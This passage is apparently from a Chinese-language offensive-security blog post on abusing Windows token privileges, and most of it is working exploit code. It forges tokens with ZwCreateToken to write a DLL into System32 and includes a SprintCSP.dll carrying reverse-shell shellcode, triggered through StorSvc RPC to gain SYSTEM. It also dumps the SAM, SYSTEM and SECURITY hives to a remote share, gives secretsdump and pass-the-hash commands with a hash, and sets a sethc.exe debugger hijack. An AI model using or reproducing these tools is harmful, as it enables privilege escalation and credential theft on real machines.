		wprintf(L"	 %-50ws", lpName);
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
			len += wsprintf(lpAttrbutes, TEXT("Enabled"));
		if (lpAttrbutes[0] == 0)
			wsprintf(lpAttrbutes, TEXT("Disabled"));
		wprintf(L"%ws\n", lpAttrbutes);
		dwLength = MAX_PATH;
	}

Clear:
	if (pTokenStatistics != NULL)
		LocalFree(pTokenStatistics);
	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;

}

void SetTokenPrivileges(PTOKEN_PRIVILEGES pTokenPrivileges)
{
	LUID luid;

	pTokenPrivileges->PrivilegeCount = 6;

	// Enable SeImpersonatePrivilege
	LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid);
	pTokenPrivileges->Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[0].Luid = luid;

	// Enable SeAssignPrimaryTokenPrivilege
	LookupPrivilegeValue(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[1].Luid = luid;

	// Enable SeCreateTokenPrivilege
	LookupPrivilegeValue(NULL, SE_CREATE_TOKEN_NAME, &luid);
	pTokenPrivileges->Privileges[2].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[2].Luid = luid;

	// Enable SeRestorePrivilege
	LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &luid);
	pTokenPrivileges->Privileges[3].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[3].Luid = luid;

	// Enable SeTakeOwnershipPrivilege
	LookupPrivilegeValue(NULL, SE_TAKE_OWNERSHIP_NAME, &luid);
	pTokenPrivileges->Privileges[4].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[4].Luid = luid;

	// Enable SeDebugPrivilege
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	pTokenPrivileges->Privileges[5].Attributes = SE_PRIVILEGE_ENABLED;
	pTokenPrivileges->Privileges[5].Luid = luid;
}

HANDLE CreateUserToken(HANDLE hToken)
{
	NTSTATUS Status;
	HANDLE pElevatedToken = NULL;
	PTOKEN_USER pTokenUser = NULL;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	PTOKEN_PRIMARY_GROUP pTokenPrimaryGroup = NULL;
	PTOKEN_DEFAULT_DACL pTokenDefaultDacl = NULL;
	TOKEN_SOURCE tokenSource;
	PTOKEN_OWNER pTokenOwner = NULL;
	SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService), SecurityImpersonation, SECURITY_STATIC_TRACKING, FALSE };
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
	LUID AuthenticationId = ANONYMOUS_LOGON_LUID;
	LARGE_INTEGER ExpirationTime;

	_ZwCreateToken ZwCreateToken;

	PISID pSid = NULL;
	SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32, DOMAIN_ALIAS_RID_ADMINS } };
	SID_INTEGRITY IntegrityMediumSID = { 1, 1, SECURITY_MANDATORY_LABEL_AUTHORITY, SECURITY_MANDATORY_MEDIUM_RID };

	HANDLE hThread = NULL;

	ZwCreateToken = (_ZwCreateToken)GetProcAddress(LoadLibraryA("ntdll"), "ZwCreateToken");
	if (ZwCreateToken == NULL) {
		printf("[-] Failed to load ZwCreateToken: %d\n", GetLastError());
		return NULL;
	}
	wprintf(L"[*] ZwCreateToken function loaded.\n");
	pTokenUser = (PTOKEN_USER)GetTokenInfo(hToken, TokenUser);

	strcpy_s(tokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	AllocateLocallyUniqueId(&tokenSource.SourceIdentifier);

	pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_PRIVILEGES) + (sizeof(LUID_AND_ATTRIBUTES) * 4));
	pTokenPrivileges = (PTOKEN_PRIVILEGES)GetTokenInfo(hToken, TokenPrivileges);
	SetTokenPrivileges(pTokenPrivileges);
	pTokenGroups = (PTOKEN_GROUPS)GetTokenInfo(hToken, TokenGroups);
	pTokenPrimaryGroup = (PTOKEN_PRIMARY_GROUP)GetTokenInfo(hToken, TokenPrimaryGroup);
	pTokenDefaultDacl = (PTOKEN_DEFAULT_DACL)GetTokenInfo(hToken, TokenDefaultDacl);

	for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
	{
		if (pTokenGroups->Groups[i].Attributes & SE_GROUP_INTEGRITY)
		{
			memcpy(pTokenGroups->Groups[i].Sid, &IntegrityMediumSID, sizeof(IntegrityMediumSID));
			wprintf(L"[*] Set the token integrity level to medium.\n");
		}

		pSid = (PISID)pTokenGroups->Groups[i].Sid;
		if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
		{
			memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
			pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
			wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
		}
		else
		{
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_USE_FOR_DENY_ONLY;
			pTokenGroups->Groups[i].Attributes &= ~SE_GROUP_ENABLED;
		}
	}

	pTokenOwner = (PTOKEN_OWNER)LocalAlloc(LPTR, sizeof(PSID));
	pTokenOwner->Owner = pTokenUser->User.Sid;

	ExpirationTime.HighPart = 0xFFFFFFFF;
	ExpirationTime.LowPart = 0xFFFFFFFF;

	Status = ZwCreateToken(
		&pElevatedToken,
		TOKEN_ALL_ACCESS,
		&objectAttributes,
		TokenImpersonation,
		&AuthenticationId,
		&ExpirationTime,
		pTokenUser,
		pTokenGroups,
		pTokenPrivileges,
		pTokenOwner,
		pTokenPrimaryGroup,
		pTokenDefaultDacl,
		&tokenSource
	);
	if (Status != STATUS_SUCCESS)
	{
		wprintf(L"[-] ZwCreateToken Error: [0x%x].\n", Status);
		goto Clear;
	}
	wprintf(L"[*] ZwCreateToken successfully and get elevated token:\n\n");

	goto Clear;

Clear:
	if (pTokenPrivileges)
		LocalFree(pTokenPrivileges);
	if (pTokenOwner)
		LocalFree(pTokenOwner);
	if (hToken)
		CloseHandle(hToken);

	return pElevatedToken;
}


BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}


int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	HANDLE pElevatedToken = NULL;
	HANDLE hThread = NULL;
	LPCWSTR sourceFile = NULL;
	LPCWSTR destFile = NULL;

	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 's':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				sourceFile = (LPCWSTR)argv[1];
			}
			break;
		case 'd':
			++argv;
			--argc;
			if (argc > 1 && argv[1][0] != '-')
			{
				destFile = (LPCWSTR)argv[1];
			}
			break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			return 0;
		}

		++argv;
		--argc;
	}

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeCreateTokenPrivilege for the current process token.
	if (!EnableTokenPrivilege(hToken, SE_CREATE_TOKEN_NAME))
	{
		wprintf(L"[-] Failed to enable SeCreateTokenPrivilege for the current process token.\n");
		return 0;
	}

	pElevatedToken = CreateUserToken(hToken);
	if (pElevatedToken == NULL)
	{
		wprintf(L"[-] Failed to create user token.\n");
		return 0;
	}

	if (!DisplayTokenInformation(pElevatedToken))
	{
		wprintf(L"[-] Failed to get S4U token information.\n");
		return 0;
	}

	hThread = GetCurrentThread();

	if (!SetThreadToken(&hThread, pElevatedToken))
	{
		wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
		return 0;
	}
	wprintf(L"\n[*] Successfully impersonated the elevated token.\n");

	if (!ExploitSeCreateTokenPrivilege(sourceFile, destFile))
	{
		wprintf(L"[-] Failed to exploit SeCreateTokenPrivilege.\n");
		return 0;
	}
}
```

### Let’s see it in action

编译上述 POC，上传到目标主机，在拥有 SeCreateTokenPrivilege 特权的账户下执行以下命令，即可向 C:\Windows\System32\ 目录中写入一个恶意 DLL 文件，如下图所示。

```console
SeCreateTokenPrivilege.exe -s malicious.dll -d C:\Windows\System32\malicious.dll
```

![image-20230706134621994](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706134621994.png)

![image-20230706135025054](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706135025054.png)

### ANONYMOUS_LOGON_LUID

不幸的是，以上测试是在 Windows 10 1803 系统上执行的，它在 Windows 10 >= 1809 或 Windows Server 2019 服务器上并不起作用......如下图所示，会报 [1346] 错误：“*Either a required impersonation level was not provided, or the provided impersonation level is invalid.*”。

![image-20230706143053564](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706143053564.png)

这是由于在安装了 *KB4507459* 补丁之后，微软添加了一些补充检查。我们生成的令牌被认为是 “特权” 的，因为它具有 “上帝” 特权和强大的组成员身份，因此新的附加控件将由于缺乏授予调用进程的特定模拟特权而将令牌的模拟级别被自动降级为 SecurityIdentification，该级别的令牌服务器不能模拟客户端。

但永远不要放弃！还记得 `ZwCreateToken()` 函数中的 AuthenticationId 吗？在之前，它被设置为 SYSTEM_LUID（0x3e7），也就是 SYSTEM 帐户的登录会话 ID。现在，让我们尝试更改它并为其分配 ANONYMOUS_LOGON_LUID（0x3e6）也许这一项被认为是无害的，但是所有后续检查都被跳过。

如下图所示，我们成功在最新的 Windows 版本（Windows Server 2022 21H2 20348.1726）上利用 SeCreateTokenPrivilege 实现任意文件写入。

![image-20230706144410386](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706144410386.png)

### Local Privilege Escalation via StorSvc

在实际利用中，我们可以通过存在缺陷的服务，利用 DLL 劫持实现本地特权提升。Windows 的 StorSvc 是一项以 NT AUTHORITY\SYSTEM 账户权限运行的服务，为存储设置和外部存储扩展提供启用服务。该服务在本地调用 SvcRebootToFlashingMode RPC 方法时，最终会尝试加载缺少的 SprintCSP.dll DLL，如下图所示。

`StorSvc.dll!SvcRebootToFlashingMode()` 方法会调用 `StorSvc.dll!InitResetPhone()` 方法：

![image-20230706150931578](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706150931578.png)

`StorSvc.dll!InitResetPhone()` 方法方法内部继续调用 `StorSvc.dll!ResetPhoneWorkerCallback()` 方法：

![image-20230706151109765](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706151109765.png)

最终，`StorSvc.dll!ResetPhoneWorkerCallback()` 将会尝试加载缺失的 SprintCSP.dll 模块，如下图所示。

![image-20230706151203987](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706151203987.png)

通过向 C:\Windows\System32\ 目录中写入一个恶意的 SprintCSP.dll 模块，当我们通过 RPC 调用 `StorSvc.dll!SvcRebootToFlashingMode()` 方法时，就会加载恶意的 DLL。

我们首先用 Visual Studio 创建一个 DLL 项目，用于制作 SprintCSP.dll，主要代码如下，其中的 Shellcode 用于向本地的 2333 端口反弹一个 Shell。

- SprintCSP.dll

```c++
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

DWORD WINAPI DoMagic(LPVOID lpParameter) {
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
        "\x49\x89\xe5\x49\xbc\x02\x00\x09\x1d\x7f\x00\x00\x01\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
        "\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
        "\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
        "\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
        "\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
        "\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
        "\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
        "\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
        "\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
        "\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
        "\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
        "\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
        "\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
        "\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();
	return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    HANDLE hThread = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        hThread = CreateThread(NULL, 0, DoMagic, 0, 0, 0);
        if (hThread) {
            CloseHandle(hThread);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

再创建另一个项目，通过 RPC 调用 `StorSvc.dll!SvcRebootToFlashingMode()` 方法，主要代码如下。关于如何调用 RPC 可以阅读我这篇博客：“[*PetitPotato - How Do I Escalate To SYSTEM Via Named Pipe*](https://whoamianony.top/posts/petitpotato-how-do-I-escalate-to-system-via-named-pipe/)”。

- RpcClient.exe

```c++
#include "storsvc_h.h"
#include <iostream>
#include <windows.h>

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	RPC_BINDING_HANDLE hBinding;

	RpcStatus = RpcStringBindingComposeW(NULL, (RPC_WSTR)L"ncalrpc", (RPC_WSTR)L"", (RPC_WSTR)L"", NULL, &StringBinding);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcStringBindingComposeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcBindingFromStringBindingW(
		StringBinding,
		&hBinding
	);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcBindingFromStringBindingW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcStatus = RpcStringFree(
		&StringBinding
	);
	if (RpcStatus != RPC_S_OK) {
		printf("[-] RpcStringFreeW() Error: [%u]\n", GetLastError());
		return 0;
	}

	RpcTryExcept
	{
		long result = Proc6_SvcRebootToFlashingMode(hBinding, 0, 0);
		if (result == 0)
			wprintf(L"[*] Dll hijack triggered!");
		else
			wprintf(L"[!] Manual reboot of StorSvc service is required.");
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
	}
	RpcEndExcept
	{
		RpcBindingFree(&hBinding);
	}

}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}
```

首先通过 SeCreateTokenPrivilege 特权将生成的 SprintCSP.dll 写入 C:\Windows\System32 目录，然后直接运行 RpcClient.exe 即可获取一个 SYSTEM 权限的交互式命令行，如下图所示。

```console
SeCreateTokenPrivilege.exe -s SprintCSP.dll -d C:\Windows\System32\SprintCSP.dll
```

![Animation](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/Animation.gif)











































## SeBackupPrivilege

SeBackupPrivilege 特权在 Microsoft 官方文档中被描述为 “*Back up files and directories*”，拥有该特权的任何进程被授予对任何文件或对象的所有读取访问控制，而不管为文件或对象指定的访问控制列表（ACL）。除读取之外的任何访问请求仍使用 ACL 进行评估。

滥用该特权，我们可以调用 `RegSaveKeyW()` 函数将 SAM 注册表转储到本地文件中，如下所示。

```c++
// Saves the specified key and all of its subkeys and values to a new file.
lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
if (lResult != ERROR_SUCCESS)
{
	wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
	return status;
}
wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
```

然后从转储文件中读取本地管理员帐户的密码哈希值，得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权，然后调用 `RegOpenKeyExW()` 函数打开并读取 `HKLM\SAM`、`HKLM\SECURITY` 和`HKLM\SYSTEM` 注册表，最后用 `RegSaveKeyW()` 函数将上述注册表保存到文件。

- SeBackupPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

BOOL ExploitSeBackupPrivilege(LPCWSTR savePath)
{
	BOOL status = FALSE;
	DWORD lResult;
	HKEY hKey;
	LPCWSTR subKeys[] = { L"SAM", L"SYSTEM",L"SECURITY" };

	for (int i = 0; i < 3; i++)
	{
		// Opens the specified registry key.
		lResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKeys[i], REG_OPTION_BACKUP_RESTORE, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegOpenKeyExW Error: [%u].\n", lResult);
			return status;
		}
		// Saves the specified key and all of its subkeys and values to a new file.
		lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
			return status;
		}
		wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
		status = TRUE;
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}

void PrintUsage()
{
	wprintf(
		L"Abuse of SeBackupPrivilege by @WHOAMI (whoamianony.top)\n\n"
		L"Arguments:\n"
		L"  -h           Show this help message and exit\n"
		L"  -o <PATH>    Where to store the sam / system / security files (can be UNC path)\n"
	);
}

int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken    = NULL;
    LPCWSTR savePath = L"C:\\Users\\Public";

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'o':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                savePath = (LPCWSTR)argv[1];
            }
            break;
		default:
			wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
			PrintUsage();
			return 0;
        }

        ++argv;
        --argc;
    }

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}
	// Enable SeBackupPrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_BACKUP_NAME))
	{
		if (ExploitSeBackupPrivilege(savePath))
		{
			return 1;
		}
	}
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将 SAM 注册表转储并导出到文件。这里通过 `-o` 选项指定保存的路径，笔者指定 UNC 路径将注册表保存到远程共享中，避免当前用户在本地系统上没有写入权限的情况，如下所示。

```c++
SeBackupPrivilege.exe -o \\172.26.10.128\evilsmb
```

![image-20230208220939973](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230208220939973.png)

接着，我们通过解析 SAM 数据库获得本地管理员的哈希，如下图所示。

```bash
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

![image-20230208214808892](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230208214808892.png)

最后，使用管理员哈希执行哈希传递，获取目标系统管理权限，如下图所示。

```bash
python3 wmiexec.py ./Administrator@172.26.10.21 -hashes :cb136a448767792bae25563a498a86e6
```

![image-20230208214159428](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230208214159428.png)

当然，我们可以直接通过 `reg save` 命令将 SAM 注册表导出，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权。

```cmd
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

![image-20230208220621473](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230208220621473.png)

## SeRestorePrivilege

SeRestorePrivilege 特权在 Microsoft 官方文档中被描述为 “*Restore files and directories*”，拥有该特权的任何进程被授予对系统上任何文件或对象的所有写访问控制，而不管为文件或对象指定的访问控制列表（ACL）。 此外，此特权允许其持有进程或线程更改文件的所有者。

在通过 API 利用此特权时，必须向支持的 API 提供相应的 `_BACKUP_` 标志，例如 `CreateFile()` 函数需要指定 `FILE_FLAG_BACKUP_SEMANTICS` 标志，`RegCreateKeyEx()` 函数需要指定 `REG_OPTION_BACKUP_RESTORE` 标志。这提示内核请求进程可能启用了 SeBackupPrivilege 或 SeRestorePrivilege，并无视 ACL 检查。

利用该特权任意写入 HKLM 注册表能够实现特权提升。例如，我们选择使用 Image File Execution Options 键，用于在系统上调试软件。启动系统二进制文件时，如果在以下注册表位置中存在一个条目并且它包含一个调试器键值，它将执行设置的条目，实现映像劫持。

```powershell
 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

此外，还可以将 DLL 放入系统文件夹中以进行 DLL 劫持、覆盖关键系统资源或修改其他服务等方式实现特权提升。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeRestorePrivilege 特权，然后通过上述两种方法滥用该特权。如果执行时 `-e` 参数为 “Dubugger”，则调用 `RegCreateKeyExW()` 函数在 `Image File Execution Options` 注册表下创建一个子项，然后用 `RegSetValueExW()` 函数为指定的程序（默认为 sethc.exe）设置 Debugger 键实现映像劫持（默认将 Debugger 键设为 C:\Windows\System32\cmd.exe）。如果 `-e` 参数为 “File”，则通过 `CreateFileW()` 函数创建文件进行 DLL 劫持、覆盖关键系统资源或修改其他服务等。

- SeRestorePrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

#define SIZE 200000

BOOL ExploitSeRestorePrivilege(LPCWSTR expType, LPCWSTR program, LPCWSTR command, LPCWSTR sourceFile, LPCWSTR destFile)
{
	BOOL status = FALSE;
	DWORD lResult;
	HKEY hKey;
	HANDLE hSource, hDestination;
	char buffer[SIZE + 1];
	DWORD dwBytesRead, dwBytesWrite;

	if (!wcscmp(expType, L"Dubugger"))
	{
		// Creates the specified registry key.
		lResult = RegCreateKeyExW(
			HKEY_LOCAL_MACHINE, 
			std::wstring(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\").append(program).c_str(), 
			0, 
			NULL,
			REG_OPTION_BACKUP_RESTORE,
			KEY_SET_VALUE, 
			NULL, 
			&hKey, 
			NULL
		);
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
			return status;
		}
		// Sets the data and type of a specified value under a registry key.
		lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)command, (wcslen(command) + 1) * sizeof(WCHAR));
		if (lResult != ERROR_SUCCESS)
		{
			wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
			return status;
		}
		wprintf(L"[*] Set Image File Execution Options for %ws successfully with Debugger as %ws.\n", program, command);
		status = TRUE;
	}
	else if(!wcscmp(expType, L"File"))
	{
		if (sourceFile && destFile)
		{
			// Open source file.
			hSource = CreateFileW(sourceFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hSource == INVALID_HANDLE_VALUE)
			{
				wprintf(L"[-] Could not open source file by CreateFileW: [%u].\n", GetLastError());
				return status;
			}
			// Create destination file.
			hDestination = CreateFileW(destFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
			if (hDestination == INVALID_HANDLE_VALUE)
			{
				wprintf(L"[-] Could not create destination file by CreateFileW: [%u].\n", GetLastError());
				return status;
			}
			// Read from source file.
			if (!ReadFile(hSource, buffer, SIZE, &dwBytesRead, NULL))
			{
				wprintf(L"[-] ReadFile Error: [%u].\n", GetLastError());
				return status;
			}
			wprintf(L"[*] Read bytes from %ws: %d\n", sourceFile, dwBytesRead);
			// Write to destination file.
			if (!WriteFile(hDestination, buffer, dwBytesRead, &dwBytesWrite, NULL))
			{
				wprintf(L"[-] WriteFile Error: [%u].\n", GetLastError());
				return status;
			}
			printf("[*] Bytes written to %ws: %d\n", destFile, dwBytesWrite);
			status = TRUE;
		}
	}
	return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
